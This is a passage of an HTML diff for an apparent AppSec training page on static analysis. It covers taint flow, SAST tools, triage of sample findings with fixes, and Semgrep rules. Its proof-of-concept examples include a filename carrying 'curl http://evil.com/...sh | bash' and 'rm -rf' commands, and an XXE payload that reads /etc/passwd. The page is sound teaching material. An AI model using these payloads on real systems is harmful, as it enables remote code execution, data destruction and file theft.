+<span class="ck">@app.route</span>(<span class="cs">'/search'</span>)
+<span class="cf">def</span> <span class="cg2">search</span>():
+<span class="lb">    term = request.args.get(<span class="cs">'q'</span>)           <span class="cm2"># ← SOURCE: tainted data enters here</span></span>
+<span class="lb">    results = search_db(term)               <span class="cm2"># ← taint propagates into function</span></span>
+    <span class="cf">return</span> jsonify(results)
+
+<span class="cf">def</span> <span class="cg2">search_db</span>(term):                        <span class="cm2"># ← taint arrives here as parameter</span>
+<span class="lb">    query = <span class="cs">f"SELECT * FROM products WHERE name LIKE '%{term}%'"</span></span>
+<span class="lb">    conn = sqlite3.connect(<span class="cs">'db.sqlite'</span>)</span>
+<span class="lb">    <span class="cf">return</span> conn.execute(query).fetchall()   <span class="cm2"># ← SINK: tainted data reaches execute()</span></span>
+<span class="cm2">                                            # ← No sanitizer between source and sink</span>
+<span class="cm2">                                            # ← FINDING: SQL Injection — CWE-89 HIGH</span>
+</pre>
+
+      <h4>Same flow — sanitized (taint cleared)</h4>
+<pre>
+<span class="cf">def</span> <span class="cg2">search_db_fixed</span>(term):
+<span class="lg">    query = <span class="cs">"SELECT * FROM products WHERE name LIKE ?"</span></span>
+<span class="lg">    conn  = sqlite3.connect(<span class="cs">'db.sqlite'</span>)</span>
+<span class="lg">    <span class="cf">return</span> conn.execute(query, (<span class="cs">f'%{term}%'</span>,)).fetchall()  <span class="cm2"># ← SANITIZER: parameterized</span></span>
+<span class="cm2">    # Taint analysis sees: tainted 'term' passed to execute() as PARAMETER not in query string</span>
+<span class="cm2">    # The parameterized query breaks the injection → taint cleared → NO FINDING</span>
+</pre>
+
+      <div class="callout cl-tip">
+        <div class="cl-icon">💡</div>
+        <div class="cl-text"><strong>Why this matters for you as an AppSec engineer:</strong> When you see a SAST finding, your job is to trace the taint flow yourself — from source to sink — and verify it's real (not a false positive). Then specify the sanitizer that breaks the chain. This is the core skill of reading and triaging SAST output, which you'll do hundreds of times in your career.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- What SAST CAN and CANNOT find -->
+  <div class="panel" id="pan-limits">
+    <div class="panel-h" onclick="tp('pan-limits')">
+      <div class="panel-dot" style="background:var(--yellow)"></div>
+      <div class="panel-title">What SAST can and cannot find — know the limits</div>
+      <div class="panel-sub">Every tool has blind spots. Knowing them makes you a better security engineer.</div>
+      <div class="panel-tog">▼</div>
+    </div>
+    <div class="panel-body">
+      <div class="two-col">
+        <div class="cg">
+          <div class="cmp-l">✅ SAST finds these well</div>
+          <ul style="list-style:none;font-size:13px;color:var(--ink2);">
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">SQL injection via string concatenation</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Command injection (shell=True, os.system)</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Hardcoded passwords, API keys, secrets</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Weak crypto (MD5, SHA1, DES, ECB mode)</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Insecure deserialization (pickle.loads)</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Reflected XSS (user input → response)</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Path traversal (open(user_input))</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">SSRF (requests.get(user_url))</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Use of dangerous functions (eval, exec)</li>
+            <li style="padding:4px 0;">Missing security headers, misconfigs in code</li>
+          </ul>
+        </div>
+        <div class="cb">
+          <div class="cmp-l">❌ SAST misses these (need DAST/manual)</div>
+          <ul style="list-style:none;font-size:13px;color:var(--ink2);">
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Business logic flaws (charging $0 for items)</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">IDOR / Broken access control (runtime auth)</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Authentication bypass requiring live session</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Race conditions and TOCTOU bugs</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Second-order injection (stored, then executed)</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Vulnerabilities in third-party libraries</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Runtime misconfigurations (server headers)</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Zero-day vulnerabilities (no rule exists yet)</li>
+            <li style="padding:4px 0;border-bottom:1px solid var(--border);">Complex multi-request attack flows</li>
+            <li style="padding:4px 0;">Vulnerabilities only visible at runtime</li>
+          </ul>
+        </div>
+      </div>
+      <div class="callout cl-warn">
+        <div class="cl-icon">⚠️</div>
+        <div class="cl-text"><strong>SAST is one layer — not the whole defence:</strong> No single tool covers everything. SAST + DAST + SCA + manual code review + pentesting work together in layers. An AppSec engineer who relies on SAST alone will miss entire categories of vulnerabilities. You need all the tools — that's why this curriculum has 20 lessons.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════ INTERMEDIATE: TOOLS -->
+<div class="section">
+  <div class="eyebrow">🟡 Intermediate — SAST Tools</div>
+  <div class="sec-title">The SAST tool landscape</div>
+  <div class="sec-sub">There are dozens of SAST tools. These are the ones you will actually encounter in professional AppSec — know all four deeply.</div>
+
+  <div class="tool-grid">
+    <div class="tool-card" id="tc-bandit" onclick="selectTool('bandit')">
+      <div class="tc-header">
+        <div class="tc-logo" style="background:rgba(26,107,60,0.1);color:var(--green);">Ban</div>
+        <div>
+          <div class="tc-name">Bandit</div>
+          <div class="tc-vendor">PyCQA / Open Source</div>
+        </div>
+      </div>
+      <div class="tc-desc">Python-only SAST tool by the Python Code Quality Authority. Simple, fast, zero configuration for basic usage. Finds common Python security issues using AST-based pattern matching. The default starting point for any Python project.</div>
+      <div class="tc-pills">
+        <span class="tc-pill" style="background:rgba(26,107,60,0.08);color:var(--green);border:1px solid rgba(26,107,60,0.2);">Free / OSS</span>
+        <span class="tc-pill" style="background:rgba(26,64,128,0.08);color:var(--blue);border:1px solid rgba(26,64,128,0.2);">Python only</span>
+        <span class="tc-pill" style="background:rgba(184,125,0,0.08);color:var(--yellow);border:1px solid rgba(184,125,0,0.2);">CLI + CI</span>
+      </div>
+    </div>
+
+    <div class="tool-card" id="tc-semgrep" onclick="selectTool('semgrep')">
+      <div class="tc-header">
+        <div class="tc-logo" style="background:rgba(212,80,10,0.1);color:var(--accent);">Smg</div>
+        <div>
+          <div class="tc-name">Semgrep</div>
+          <div class="tc-vendor">Semgrep Inc. (OSS core)</div>
+        </div>
+      </div>
+      <div class="tc-desc">Multi-language SAST with an intuitive rule syntax. Rules look like the code they match. Supports 30+ languages. Massive community rule library (semgrep.dev). The industry standard for custom rule writing. Powers security reviews at Dropbox, Figma, and hundreds of others.</div>
+      <div class="tc-pills">
+        <span class="tc-pill" style="background:rgba(26,107,60,0.08);color:var(--green);border:1px solid rgba(26,107,60,0.2);">OSS core</span>
+        <span class="tc-pill" style="background:rgba(26,64,128,0.08);color:var(--blue);border:1px solid rgba(26,64,128,0.2);">30+ languages</span>
+        <span class="tc-pill" style="background:rgba(107,45,155,0.08);color:var(--purple);border:1px solid rgba(107,45,155,0.2);">Custom rules</span>
+      </div>
+    </div>
+
+    <div class="tool-card" id="tc-sonar" onclick="selectTool('sonar')">
+      <div class="tc-header">
+        <div class="tc-logo" style="background:rgba(26,64,128,0.1);color:var(--blue);">SoQ</div>
+        <div>
+          <div class="tc-name">SonarQube</div>
+          <div class="tc-vendor">SonarSource</div>
+        </div>
+      </div>
+      <div class="tc-desc">Full-featured SAST + code quality platform. Enterprise-grade with a web dashboard, PR decoration, quality gates, and historical trend tracking. Community edition is free. Developer and Enterprise editions add taint analysis and security-specific rules. The standard in most enterprise environments.</div>
+      <div class="tc-pills">
+        <span class="tc-pill" style="background:rgba(26,107,60,0.08);color:var(--green);border:1px solid rgba(26,107,60,0.2);">Community free</span>
+        <span class="tc-pill" style="background:rgba(26,64,128,0.08);color:var(--blue);border:1px solid rgba(26,64,128,0.2);">20+ languages</span>
+        <span class="tc-pill" style="background:rgba(13,107,94,0.08);color:var(--teal);border:1px solid rgba(13,107,94,0.2);">Dashboard</span>
+      </div>
+    </div>
+
+    <div class="tool-card" id="tc-codeql" onclick="selectTool('codeql')">
+      <div class="tc-header">
+        <div class="tc-logo" style="background:rgba(107,45,155,0.1);color:var(--purple);">CQL</div>
+        <div>
+          <div class="tc-name">CodeQL</div>
+          <div class="tc-vendor">GitHub (Microsoft)</div>
+        </div>
+      </div>
+      <div class="tc-desc">GitHub's powerful query-based SAST. Converts your code into a relational database and lets you query it like SQL. Extremely accurate taint analysis. Used by Google Project Zero and security researchers. Free for open-source projects via GitHub Advanced Security. The most powerful SAST tool available, with steeper learning curve.</div>
+      <div class="tc-pills">
+        <span class="tc-pill" style="background:rgba(26,107,60,0.08);color:var(--green);border:1px solid rgba(26,107,60,0.2);">Free for OSS</span>
+        <span class="tc-pill" style="background:rgba(26,64,128,0.08);color:var(--blue);border:1px solid rgba(26,64,128,0.2);">GitHub native</span>
+        <span class="tc-pill" style="background:rgba(192,37,30,0.08);color:var(--red);border:1px solid rgba(192,37,30,0.2);">Most powerful</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Tool detail panels -->
+  <div id="tool-detail"></div>
+</div>
+
+<!-- ══════════════════════════════════════════ INTERMEDIATE: REAL FINDINGS -->
+<div class="section">
+  <div class="eyebrow">🟡 Intermediate — Real SAST Findings</div>
+  <div class="sec-title">Reading and triaging SAST findings</div>
+  <div class="sec-sub">This is what your day-to-day looks like as an AppSec engineer — a queue of SAST findings you must triage: is it real? Is it critical? Who owns the fix? What is the fix? Click each finding to expand the full analysis.</div>
+
+  <!-- Finding 1 -->
+  <div class="finding crit" id="f1" onclick="toggleF('f1')">
+    <div class="finding-top">
+      <div>
+        <div class="finding-title">B602 — subprocess.call() with shell=True using user-controlled input</div>
+        <div class="finding-meta">src/utils/file_processor.py:47 · Bandit B602 · CWE-78 OS Command Injection</div>
+      </div>
+      <span class="finding-sev sev-crit">CRITICAL</span>
+    </div>
+    <div class="finding-detail" id="f1-d">
+      <h5>Vulnerable Code</h5>
+<pre>
+<span class="cm2"># file_processor.py — line 47</span>
+<span class="cf">def</span> <span class="cg2">convert_image</span>(filename):
+    <span class="cm2"># Converts uploaded image to PNG using ImageMagick</span>
+<span class="lb">    cmd = <span class="cs">f"convert {filename} output.png"</span></span>
+<span class="lb">    subprocess.call(cmd, shell=<span class="ck">True</span>)   <span class="cm2"># ← B602: shell=True + user input</span></span>
+</pre>
+      <h5>Why It's Critical</h5>
+      <p>The <code>filename</code> parameter comes from a user-uploaded file name. With <code>shell=True</code>, the entire string is passed to <code>/bin/sh -c</code>. An attacker names their file <code>photo.jpg; curl http://evil.com/shell.sh | bash</code> — the shell executes the semicolon as a command separator and runs the attacker's shell script. This is Remote Code Execution (RCE) — complete server compromise.</p>
+      <h5>Attack Proof of Concept</h5>
+<pre>
+<span class="cm2"># Attacker uploads file with name:</span>
+filename = <span class="cs">"photo.jpg; rm -rf /var/www/html && curl http://evil.com/backdoor.sh | bash"</span>
+
+<span class="cm2"># Shell executes:</span>
+<span class="cm2"># $ convert photo.jpg; rm -rf /var/www/html && curl http://evil.com/backdoor.sh | bash</span>
+<span class="cm2"># → web root deleted, backdoor installed</span>
+</pre>
+      <h5>Fix</h5>
+<pre>
+<span class="cf">import</span> subprocess, os, re
+
+<span class="cf">def</span> <span class="cg2">convert_image_fixed</span>(filename):
+<span class="lg">    <span class="cm2"># Fix 1: validate filename with allowlist BEFORE use</span></span>
+<span class="lg">    <span class="cf">if not</span> re.match(<span class="cs">r'^[\w\-. ]+\.(jpg|jpeg|png|gif|webp)$'</span>, filename):</span>
+<span class="lg">        <span class="cf">raise</span> ValueError(<span class="cs">"Invalid filename"</span>)</span>
+<span class="lg">    <span class="cm2"># Fix 2: pass as list — no shell, no injection</span></span>
+<span class="lg">    subprocess.run(                         <span class="cm2"># ← shell=False (default)</span></span>
+<span class="lg">        [<span class="cs">"convert"</span>, filename, <span class="cs">"output.png"</span>],  <span class="cm2"># ← list → no shell interpolation</span></span>
+<span class="lg">        check=<span class="ck">True</span>,</span>
+<span class="lg">        timeout=<span class="ce">30</span></span>
+<span class="lg">    )</span>
+</pre>
+      <h5>Verdict</h5>
+      <div class="pill-row"><span class="pill pr">TRUE POSITIVE</span><span class="pill pr">Fix immediately — P0</span><span class="pill pr">CWE-78</span><span class="pill pr">OWASP A03 Injection</span></div>
+    </div>
+  </div>
+
+  <!-- Finding 2 -->
+  <div class="finding high" id="f2" onclick="toggleF('f2')">
+    <div class="finding-top">
+      <div>
+        <div class="finding-title">B324 — Use of MD5 or SHA1 hash function</div>
+        <div class="finding-meta">src/auth/password.py:12 · Bandit B324 · CWE-327 Weak Cryptographic Algorithm</div>
+      </div>
+      <span class="finding-sev sev-high">HIGH</span>
+    </div>
+    <div class="finding-detail" id="f2-d">
+      <h5>Vulnerable Code</h5>
+<pre>
+<span class="cf">import</span> hashlib
+
+<span class="cf">def</span> <span class="cg2">hash_password</span>(password: str) -> str:
+<span class="lb">    <span class="cf">return</span> hashlib.md5(password.encode()).hexdigest()   <span class="cm2"># ← B324: MD5 is broken for passwords</span></span>
+</pre>
+      <h5>Why It's High Severity</h5>
+      <p>MD5 produces a 128-bit hash. Modern GPUs can compute <strong>50 billion MD5 hashes per second</strong>. A password like "password123" in an MD5 hash database would be cracked in milliseconds using a rainbow table lookup. After a database breach, every MD5-hashed password in the database is effectively plaintext.</p>
+      <h5>The Numbers</h5>
+      <table>
+        <tr><th>Hash Algorithm</th><th>GPU Speed (RTX 4090)</th><th>Time to crack "P@ssw0rd"</th><th>Verdict</th></tr>
+        <tr><td style="color:var(--red)">MD5</td><td>~150 billion/sec</td><td>Milliseconds (rainbow table)</td><td style="color:var(--red)">Never use for passwords</td></tr>
+        <tr><td style="color:var(--red)">SHA-256</td><td>~20 billion/sec</td><td>Seconds to minutes (GPU farm)</td><td style="color:var(--red)">Never use for passwords</td></tr>
+        <tr><td style="color:var(--yellow)">bcrypt (cost=10)</td><td>~184/sec</td><td>Thousands of years</td><td style="color:var(--yellow)">Minimum acceptable</td></tr>
+        <tr><td style="color:var(--green)">bcrypt (cost=12)</td><td>~46/sec</td><td>Essentially impossible</td><td style="color:var(--green)">Recommended</td></tr>
+        <tr><td style="color:var(--green)">Argon2id</td><td>Configurable</td><td>Essentially impossible (memory-hard)</td><td style="color:var(--green)">Best in class</td></tr>
+      </table>
+      <h5>Fix</h5>
+<pre>
+<span class="cf">import</span> bcrypt
+
+<span class="cf">def</span> <span class="cg2">hash_password_fixed</span>(password: str) -> bytes:
+<span class="lg">    salt = bcrypt.gensalt(rounds=<span class="ce">12</span>)               <span class="cm2"># auto-generates unique salt</span></span>
+<span class="lg">    <span class="cf">return</span> bcrypt.hashpw(password.encode(), salt)    <span class="cm2"># work factor = 2^12 iterations</span></span>
+
+<span class="cf">def</span> <span class="cg2">verify_password</span>(password: str, hashed: bytes) -> bool:
+<span class="lg">    <span class="cf">return</span> bcrypt.checkpw(password.encode(), hashed)  <span class="cm2"># constant-time comparison built in</span></span>
+</pre>
+      <div class="pill-row"><span class="pill pr">TRUE POSITIVE</span><span class="pill py">Fix in current sprint — P1</span><span class="pill py">CWE-327</span><span class="pill py">OWASP A02</span></div>
+    </div>
+  </div>
+
+  <!-- Finding 3 -->
+  <div class="finding high" id="f3" onclick="toggleF('f3')">
+    <div class="finding-top">
+      <div>
+        <div class="finding-title">B105 — Hardcoded password string assignment</div>
+        <div class="finding-meta">config/settings.py:8 · Bandit B105 · CWE-259 Hard-coded Password</div>
+      </div>
+      <span class="finding-sev sev-high">HIGH</span>
+    </div>
+    <div class="finding-detail" id="f3-d">
+      <h5>Vulnerable Code</h5>
+<pre>
+<span class="cm2"># config/settings.py</span>
+<span class="lb">SECRET_KEY = <span class="cs">"django-insecure-abc123xyz789"</span>   <span class="cm2"># ← B105: hardcoded secret</span></span>
+<span class="lb">DATABASE_PASSWORD = <span class="cs">"P@ssw0rd!123"</span>             <span class="cm2"># ← B105: hardcoded DB password</span></span>
+<span class="lb">AWS_SECRET_KEY = <span class="cs">"wJalrXUtnFEMI/K7MDENG"</span>        <span class="cm2"># ← B105: hardcoded AWS credentials</span></span>
+</pre>
+      <h5>Why It's High Severity</h5>
+      <p>Any developer with git access — or anyone who ever forks/clones the repo — has these credentials. Even if you delete them later, they exist in git history forever. Automated scanners (TruffleHog, GitLeaks) continuously scan GitHub for these patterns. Within minutes of a repo becoming public, bots collect and use leaked credentials. The AWS key above could be used to spin up EC2 instances, mine cryptocurrency, or exfiltrate data — all billed to you.</p>
+      <h5>Fix</h5>
+<pre>
+<span class="cm2"># config/settings.py — fixed</span>
+<span class="cf">import</span> os
+
+<span class="lg">SECRET_KEY      = os.environ[<span class="cs">'DJANGO_SECRET_KEY'</span>]      <span class="cm2"># raises KeyError if missing — intentional</span></span>
+<span class="lg">DATABASE_PASSWORD = os.environ[<span class="cs">'DB_PASSWORD'</span>]</span>
+<span class="lg">AWS_SECRET_KEY  = os.environ[<span class="cs">'AWS_SECRET_ACCESS_KEY'</span>]</span>
+
+<span class="cm2"># For production: use HashiCorp Vault or AWS Secrets Manager</span>
+<span class="cm2"># For local dev: use .env file with python-dotenv (add .env to .gitignore!)</span>
+<span class="cm2"># NEVER: store defaults in code, even "dev-only" ones</span>
+</pre>
+      <div class="pill-row"><span class="pill pr">TRUE POSITIVE</span><span class="pill pr">Rotate credentials NOW + fix code — P0</span><span class="pill py">CWE-259</span></div>
+    </div>
+  </div>
+
+  <!-- Finding 4 — FALSE POSITIVE -->
+  <div class="finding med" id="f4" onclick="toggleF('f4')">
+    <div class="finding-top">
+      <div>
+        <div class="finding-title">B301 — Use of pickle.loads() — possible insecure deserialization</div>
+        <div class="finding-meta">src/cache/session_cache.py:33 · Bandit B301 · CWE-502</div>
+      </div>
+      <span class="finding-sev sev-med">MEDIUM</span>
+    </div>
+    <div class="finding-detail" id="f4-d">
+      <h5>Flagged Code</h5>
+<pre>
+<span class="cm2"># session_cache.py — line 33</span>
+<span class="cf">import</span> pickle
+<span class="cf">import</span> redis
+
+r = redis.Redis()
+
+<span class="cf">def</span> <span class="cg2">load_session</span>(session_id: str):
+<span class="lw">    data = r.get(<span class="cs">f"session:{session_id}"</span>)</span>
+<span class="lw">    <span class="cf">return</span> pickle.loads(data) <span class="cf">if</span> data <span class="cf">else</span> <span class="ck">None</span>   <span class="cm2"># ← B301: pickle.loads flagged</span></span>
+</pre>
+      <h5>Triage — Is This a Real Vulnerability?</h5>
+      <p><strong>This requires investigation.</strong> Pickle deserialization is dangerous when the data being deserialized can be controlled by an attacker. The question is: can an attacker control what's in <code>session:{session_id}</code> in Redis?</p>
+      <p><strong>Scenario A — FALSE POSITIVE:</strong> Redis is on a private subnet with no external access. Only your application writes to it. Session IDs are cryptographically random 128-bit values, not guessable. An attacker cannot write arbitrary data to Redis → the pickle data is trusted → the risk is low → this is a false positive for this specific deployment.</p>
+      <p><strong>Scenario B — TRUE POSITIVE:</strong> Redis is on the same host as the web server, exposed on 0.0.0.0:6379 with no auth (default Redis config). An attacker who reaches the network can SET session:anyid to a malicious pickle payload, then trigger load_session() → RCE.</p>
+      <h5>How to Resolve</h5>
+<pre>
+<span class="cm2"># Check Redis exposure — run this on the server:</span>
+$ redis-cli ping              <span class="cm2"># if returns PONG from public IP → EXPOSED!</span>
+$ netstat -tlnp | grep 6379   <span class="cm2"># should show 127.0.0.1:6379, NOT 0.0.0.0:6379</span>
+
+<span class="cm2"># Best fix regardless: replace pickle with JSON for session data</span>
+<span class="cf">import</span> json
+
+<span class="cf">def</span> <span class="cg2">save_session</span>(session_id: str, data: dict):
+<span class="lg">    r.set(<span class="cs">f"session:{session_id}"</span>, json.dumps(data), ex=<span class="ce">3600</span>)  <span class="cm2"># JSON is safe</span></span>
+
+<span class="cf">def</span> <span class="cg2">load_session</span>(session_id: str):
+    data = r.get(<span class="cs">f"session:{session_id}"</span>)
+<span class="lg">    <span class="cf">return</span> json.loads(data) <span class="cf">if</span> data <span class="cf">else</span> <span class="ck">None</span>                <span class="cm2"># JSON cannot execute code</span></span>
+</pre>
+      <h5>Verdict</h5>
+      <div class="pill-row"><span class="pill py">CONTEXT-DEPENDENT</span><span class="pill pg">Suppressed if Redis private + auth required</span><span class="pill py">Fix recommended: replace pickle → JSON</span></div>
+      <p style="margin-top:.75rem;font-size:13px;color:var(--ink2);">Document in your suppression file: <code># nosec B301 — Redis on private subnet, no external access, monitored by VPC security group. Ticket #4521 to migrate to JSON.</code></p>
+    </div>
+  </div>
+
+  <!-- Finding 5 -->
+  <div class="finding high" id="f5" onclick="toggleF('f5')">
+    <div class="finding-top">
+      <div>
+        <div class="finding-title">G401 — Use of unsafe XML parsing — XXE vulnerability</div>
+        <div class="finding-meta">src/parsers/invoice_parser.py:22 · Semgrep xml.etree · CWE-611 XXE</div>
+      </div>
+      <span class="finding-sev sev-high">HIGH</span>
+    </div>
+    <div class="finding-detail" id="f5-d">
+      <h5>Vulnerable Code</h5>
+<pre>
+<span class="cm2"># invoice_parser.py — parsing customer-uploaded invoices</span>
+<span class="cf">import</span> xml.etree.ElementTree <span class="cf">as</span> ET
+
+<span class="cf">def</span> <span class="cg2">parse_invoice</span>(xml_data: str):
+<span class="lb">    tree = ET.fromstring(xml_data)   <span class="cm2"># ← Vulnerable to XXE (XML External Entity)</span></span>
+    <span class="cf">return</span> {
+        <span class="cs">'vendor'</span>: tree.find(<span class="cs">'vendor'</span>).text,
+        <span class="cs">'amount'</span>: tree.find(<span class="cs">'amount'</span>).text,
+    }
+</pre>
+      <h5>Why It's High Severity — The XXE Attack</h5>
+      <p>XML External Entities (XXE) allow an attacker to include external files or URLs in their XML payload. When your parser processes the XML, it fetches the external entity — which can be a local file (<code>/etc/passwd</code>), an internal network URL (SSRF), or even a billion-byte string that crashes your server (Billion Laughs DoS).</p>
+<pre>
+<span class="cm2">&lt;!-- Attacker's malicious invoice XML: --&gt;</span>
+<span class="cr2">&lt;?xml version="1.0"?&gt;</span>
+<span class="cr2">&lt;!DOCTYPE invoice [</span>
+<span class="cr2">  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;   &lt;!-- reads local file --&gt;</span>
+<span class="cr2">  &lt;!-- OR: SYSTEM "http://169.254.169.254/latest/meta-data/" → SSRF --&gt;</span>
+<span class="cr2">]&gt;</span>
+<span class="cr2">&lt;invoice&gt;</span>
+<span class="cr2">  &lt;vendor&gt;&amp;xxe;&lt;/vendor&gt;   &lt;!-- parser inserts /etc/passwd content here --&gt;</span>
+<span class="cr2">  &lt;amount&gt;100&lt;/amount&gt;</span>
+<span class="cr2">&lt;/invoice&gt;</span>
+<span class="cm2">&lt;!-- Response: {"vendor": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...", ...} --&gt;</span>
+</pre>
+      <h5>Fix — Disable External Entity Processing</h5>
+<pre>
+<span class="cm2"># Python's xml.etree.ElementTree is safe by default from Python 3.8+</span>
+<span class="cm2"># BUT lxml is NOT safe by default — you must explicitly disable XXE</span>
+<span class="cf">from</span> lxml <span class="cf">import</span> etree
+
+<span class="cf">def</span> <span class="cg2">parse_invoice_fixed</span>(xml_data: bytes):
+<span class="lg">    parser = etree.XMLParser(</span>
+<span class="lg">        resolve_entities=<span class="ck">False</span>,  <span class="cm2"># ← disable external entity resolution</span></span>
+<span class="lg">        no_network=<span class="ck">True</span>,          <span class="cm2"># ← block network access from XML parser</span></span>
+<span class="lg">        huge_tree=<span class="ck">False</span>           <span class="cm2"># ← prevent Billion Laughs DoS</span></span>
+<span class="lg">    )</span>
+<span class="lg">    tree = etree.fromstring(xml_data, parser)</span>
+    <span class="cf">return</span> {
+        <span class="cs">'vendor'</span>: tree.find(<span class="cs">'vendor'</span>).text,
+        <span class="cs">'amount'</span>: tree.find(<span class="cs">'amount'</span>).text,
+    }
+</pre>
+      <div class="pill-row"><span class="pill pr">TRUE POSITIVE</span><span class="pill pr">Fix immediately — P1</span><span class="pill pr">CWE-611</span><span class="pill pr">OWASP A05</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════ ADVANCED: WRITING SEMGREP RULES -->
+<div class="section">
+  <div class="eyebrow">🔴 Advanced — Writing Custom SAST Rules</div>
+  <div class="sec-title">Writing Semgrep rules from scratch</div>
+  <div class="sec-sub">Built-in rules cover common patterns. Custom rules cover YOUR codebase's specific risks — internal frameworks, proprietary APIs, business-logic-adjacent security checks. Writing them is a core AppSec skill.</div>
+
+  <div class="callout cl-info">
+    <div class="cl-icon">ℹ️</div>
+    <div class="cl-text"><strong>Why custom rules matter:</strong> If your team uses an internal ORM wrapper called <code>db.raw_query()</code>, no built-in Semgrep rule will flag dangerous usage of it. You must write one. Custom rules are also how you encode your organization's specific security standards — "all HTTP requests must use our internal <code>SecureRequests</code> client, never <code>requests</code> directly."</div>
+  </div>
+
+  <!-- Rule anatomy -->
+  <div class="panel" id="pan-rule">
+    <div class="panel-h" onclick="tp('pan-rule')">
+      <div class="panel-dot" style="background:var(--accent)"></div>
+      <div class="panel-title">Semgrep rule anatomy — every field explained</div>
+      <div class="panel-sub">A Semgrep rule is a YAML file. Here is every field you need to know.</div>
+      <div class="panel-tog">▼</div>
+    </div>
+    <div class="panel-body">
+<pre>
+<span class="cm2"># Complete Semgrep rule — annotated</span>
+rules:
+  - id: <span class="cs">no-raw-sql-concatenation</span>                  <span class="cm2"># unique ID — used in suppressions</span>
+    message: <span class="cs">"SQL injection: user input concatenated into query. Use parameterized queries."</span>
+    severity: <span class="cv">ERROR</span>                                 <span class="cm2"># ERROR/WARNING/INFO</span>
+    languages: [<span class="cs">python</span>]                             <span class="cm2"># which language this rule applies to</span>
+    metadata:
+      category: <span class="cs">security</span>
+      cwe: <span class="cs">CWE-89</span>
+      owasp: <span class="cs">A03:2021 - Injection</span>
+      confidence: <span class="cv">HIGH</span>                               <span class="cm2"># HIGH/MEDIUM/LOW — helps triage</span>
+    patterns:                                       <span class="cm2"># ALL patterns must match (AND logic)</span>
+      - pattern: |
+          $QUERY = <span class="cs">"..."</span> + <span class="cv">$VAR</span>                     <span class="cm2"># matches: query = "SELECT..." + var</span>
+      - pattern-either:                             <span class="cm2"># ANY of these match (OR logic)</span>
+          - pattern: db.execute(<span class="cv">$QUERY</span>)
+          - pattern: cursor.execute(<span class="cv">$QUERY</span>)
+          - pattern: conn.execute(<span class="cv">$QUERY</span>)
+      - pattern-not: |                              <span class="cm2"># EXCLUDE false positives</span>
+          <span class="cv">$QUERY</span> = <span class="cs">"..."</span> + STATIC_CONSTANT            <span class="cm2"># allow: query + compile-time constant</span>
+    fix: |                                          <span class="cm2"># auto-fix suggestion (optional)</span>
+      db.execute(<span class="cs">"SELECT * FROM users WHERE id = %s"</span>, (<span class="cv">$VAR</span>,))
+</pre>
+      <h4>Pattern operators — the full set</h4>
+      <table>
+        <tr><th>Operator</th><th>Meaning</th><th>Example use</th></tr>
+        <tr><td style="font-family:'Inconsolata',monospace;color:var(--accent)">pattern</td><td>Single pattern must match exactly</td><td>Match a specific function call pattern</td></tr>
+        <tr><td style="font-family:'Inconsolata',monospace;color:var(--accent)">patterns (AND)</td><td>ALL sub-patterns must match in same code block</td><td>Match function call AND it uses a tainted variable</td></tr>
+        <tr><td style="font-family:'Inconsolata',monospace;color:var(--accent)">pattern-either (OR)</td><td>ANY sub-pattern matches</td><td>Match db.execute() OR cursor.execute() OR conn.execute()</td></tr>
+        <tr><td style="font-family:'Inconsolata',monospace;color:var(--accent)">pattern-not</td><td>Exclude matches where this sub-pattern also matches</td><td>Exclude calls that use a sanitizer</td></tr>
+        <tr><td style="font-family:'Inconsolata',monospace;color:var(--accent)">pattern-inside</td><td>Match only inside a specific context</td><td>Only flag inside functions decorated with @app.route</td></tr>
+        <tr><td style="font-family:'Inconsolata',monospace;color:var(--accent)">pattern-not-inside</td><td>Exclude matches inside a specific context</td><td>Don't flag inside test files</td></tr>
+        <tr><td style="font-family:'Inconsolata',monospace;color:var(--accent)">$VAR (metavariable)</td><td>Wildcard that captures any expression</td><td>$VAR matches any variable name or expression</td></tr>
+        <tr><td style="font-family:'Inconsolata',monospace;color:var(--accent)">...</td><td>Ellipsis — matches any number of arguments or statements</td><td>func(..., user_input, ...) matches any call passing user_input</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- 3 real custom rules -->
+  <div class="panel" id="pan-r1">
+    <div class="panel-h" onclick="tp('pan-r1')">
+      <div class="panel-dot" style="background:var(--red)"></div>
+      <div class="panel-title">Custom Rule 1 — Detect missing @login_required on Flask routes</div>
+      <div class="panel-sub">A company-specific rule: all routes must be decorated with @login_required unless explicitly exempted</div>
+      <div class="panel-tog">▼</div>
+    </div>
+    <div class="panel-body">
+      <p>Your company policy: every Flask route must be authenticated. Routes accessible without auth must be explicitly tagged <code># noauth-ok</code>. This rule flags any <code>@app.route</code> that doesn't also have <code>@login_required</code>.</p>
+<pre>
+rules:
+  - id: <span class="cs">flask-route-missing-auth</span>
+    message: <span class="cs">"Flask route lacks @login_required. Add it or document why auth is not needed."</span>
+    severity: <span class="cv">WARNING</span>
+    languages: [<span class="cs">python</span>]
+    metadata:
+      cwe: <span class="cs">CWE-306</span>
+      owasp: <span class="cs">A01:2021 - Broken Access Control</span>
+      confidence: <span class="cv">MEDIUM</span>
+    patterns:
+      - pattern-inside: |
+          <span class="cv">@app.route(...)</span>
+          <span class="cf">def</span> <span class="cv">$FUNC</span>(...):
+              ...
+      - pattern-not-inside: |
